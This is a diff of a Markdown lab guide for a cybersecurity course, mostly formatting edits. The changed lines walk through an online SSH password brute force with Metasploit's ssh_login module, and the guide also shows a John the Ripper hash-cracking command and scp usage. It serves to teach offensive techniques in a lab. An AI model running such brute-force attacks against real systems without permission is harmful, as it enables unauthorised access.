@@ -110,23 +110,23 @@ sudo passwd root
 #### **Kali - Attack Steps:**
 **Step 1:** Attempt to ssh the target machine to ensure that it has password authentication turned on (see setting up SSH server on target machine), after 3 failures the permission will be denied.  
 **Step 2:** Ensure you are in root for your Kali box by using the following command:  
-`sudo su` 
-Step 3: To open the Metaspoitconsole run the following command:  
-`msfconsole`  
-**Step 4:** Open the ssh login scanner  
- - 4a: Use the following command to see all the possibilities of the Metasploit console dealing with SSH:  
-`msf6 > search ssh`  
- - 4b:  `msf6 > use auxiliary/scanner/ssh/ssh_login`  
- - 4c:  `msf6 > show options`  
-**Step 5:** Set the ssh_login tool to target the vulnerable machine   
- - 5a `msf6 > set RHOSTS 192.168.XX.XX` (vulnerable machine address)   
- - 5b`msf6 > set PASS_FILE /home/kali/Desktop/passwords.txt` (path of the passwords text file)   
- - 5c `msf6 > set USER_FILE /home/kali/Desktop/usernames.txt` (path of the usernames text file)   
- - 5d `msf6 > set VERBOSE true` (it will show the exactly matched combination of username and password) 
+#### `sudo su`   
+Step 3: To open the Metaspoitconsole run the following command:    
+#### `msfconsole`    
+**Step 4:** Open the ssh login scanner    
+ - 4a: Use the following command to see all the possibilities of the Metasploit console dealing with SSH:    
+`msf6 > search ssh`    
+ - 4b:  `msf6 > use auxiliary/scanner/ssh/ssh_login`    
+ - 4c:  `msf6 > show options`    
+**Step 5:** Set the ssh_login tool to target the vulnerable machine:     
+ - 5a `msf6 > set RHOSTS 192.168.XX.XX` (vulnerable machine address)     
+ - 5b`msf6 > set PASS_FILE /home/kali/Desktop/passwords.txt` (path of the passwords text file)     
+ - 5c `msf6 > set USER_FILE /home/kali/Desktop/usernames.txt` (path of the usernames text file)     
+ - 5d `msf6 > set VERBOSE true` (it will show the exactly matched combination of username and password)    
 **Step 6** Check all of your options to ensure they look the way you want    
-`msf6 > show options`
-**Step 7:** Run and get some coffee (this takes some time, because it is an online brute force!)    
-`msf6 > run`   
+#### `msf6 > show options`    
+**Step 7:** Run and get some coffee (this takes some time, because it is an online brute force!)        
+#### `msf6 > run`       
 
 ## **Challenges in Cyber.org (Must Be Set Up Ahead of Time)**  
 
@@ -162,8 +162,7 @@ john -format=raw-md5 -wordlist:JohnnyPasswordList.txt SCPhash.txt
 
 - [SCPhash1](https://forms.office.com/Pages/ResponsePage.aspx?id=mhxxjxzsu023kLsMdxsdzM6J33C5yQRJgc1SHWy_64dUMjhJUVE0T1FBRDI1SFc5MDdVNVdBQVpNVC4u)  
 - [SCPhash2](https://forms.office.com/Pages/ResponsePage.aspx?id=mhxxjxzsu023kLsMdxsdzM6J33C5yQRJgc1SHWy_64dUQ1VBMTc0Q1hGVTFVWjZKNDlQSU9YRUI1Sy4u)  
-- [SCPhash3](https://forms.office.com/Pages/ResponsePage.aspx?id=mhxxjxzsu023kLsMdxsdzM6J33C5yQRJgc1SHWy_64dUOVZTM1dKVktUUUtONFVQUUZWNUxQTVdOVi4u)  
-- **SCPhash4** *(Link not provided – please add if available)*  
+- [SCPhash3](https://forms.office.com/Pages/ResponsePage.aspx?id=mhxxjxzsu023kLsMdxsdzM6J33C5yQRJgc1SHWy_64dUOVZTM1dKVktUUUtONFVQUUZWNUxQTVdOVi4u)     
 
 ### **More Details**  
 📖 [Using SCP Command in Linux: 10 Practical Examples Explained - Linux Handbook](https://linuxhandbook.com/scp-command/)  
@@ -189,7 +188,7 @@ scp    </PathToFile/LocalFile> <remote_username>@<IPorHost>:<PathToLocation>
 ```
 
 Example:
-`scp /home/kali/CourseFiles/Cybersecurity/steganography-lab/image1.jpg ubuntu@10.15.8.29:/home/ubuntu/Desktop/jboyce1/`
+#### `scp /home/kali/CourseFiles/Cybersecurity/steganography-lab/image1.jpg ubuntu@10.15.8.29:/home/ubuntu/Desktop/jboyce1/`
 
 ### **SCP File from Local to Remote**   
 
